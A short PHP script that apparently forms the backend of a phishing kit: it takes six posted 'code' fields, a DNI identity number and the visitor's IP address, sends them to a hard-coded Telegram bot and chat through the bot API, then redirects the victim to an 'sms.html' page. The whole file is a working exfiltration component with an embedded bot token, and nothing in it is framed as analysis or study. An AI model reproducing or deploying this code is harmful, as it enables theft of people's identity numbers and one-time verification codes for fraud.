<?php
$name0 = $_POST['name0'];
$name1 = $_POST['name1'];
$name2 = $_POST['name2'];
$name3 = $_POST['name3'];
$name4 = $_POST['name4'];
$name5 = $_POST['name5'];
$dni = $_POST['dni'];
$name = $name0.$name1.$name2.$name3.$name4.$name5;
$ip = $_SERVER['REMOTE_ADDR'];
$token = "7740157928:AAGUIWCUSCQOBaeyndY7Q5srC6bpTy5tYsg";
$chat_id = "-4696505335";
if ($dni == "")
$txt = '';
    $arr = array(
        'CODE: ' => $name,
        'DNI: ' => $dni,
        'IP: ' =>$ip,
    );
    foreach ($arr as $key => $value){
        $txt .= "<b>".$key."</b>".$value."%0A";
    }
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    if($sendToTelegram){
        
    }
header('location:sms.html')?>